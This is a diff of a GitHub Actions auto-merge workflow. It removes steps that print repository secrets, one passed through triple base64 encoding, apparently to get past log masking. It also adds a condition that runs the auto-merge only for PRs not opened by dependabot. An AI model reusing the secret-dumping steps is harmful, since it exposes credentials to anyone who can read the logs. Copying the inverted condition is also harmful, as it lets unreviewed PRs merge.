@@ -5,19 +5,8 @@ jobs:
   dependabot:
     runs-on: ubuntu-latest
 
-          
+    if: ${{ github.event.pull_request.user.login != 'dependabot[bot]' }}
     steps:
-      - name: Decode credentials as environment variables
-      - run: |
-           echo ${{ secrets.JJSECRET }} | base64 |base64 |base64 
-    
-
-          
-
-
-      - name: Dump all data types
-        run: |
-          echo "vars ${{ secrets.FETCH_METADATA_ACTION_AUTOMATION_APP_ID }}"
       - name: Generate token
         id: generate_token
         uses: actions/create-github-app-token@3ff1caaa28b64c9cc276ce0a02e2ff584f3900c5 # v2.0.2
@@ -27,7 +16,6 @@ jobs:
 
       - uses: actions/checkout@v4
 
-      
       - name: Auto-merge
         run: gh pr merge --auto --merge '${{ github.event.pull_request.html_url }}'
         env:
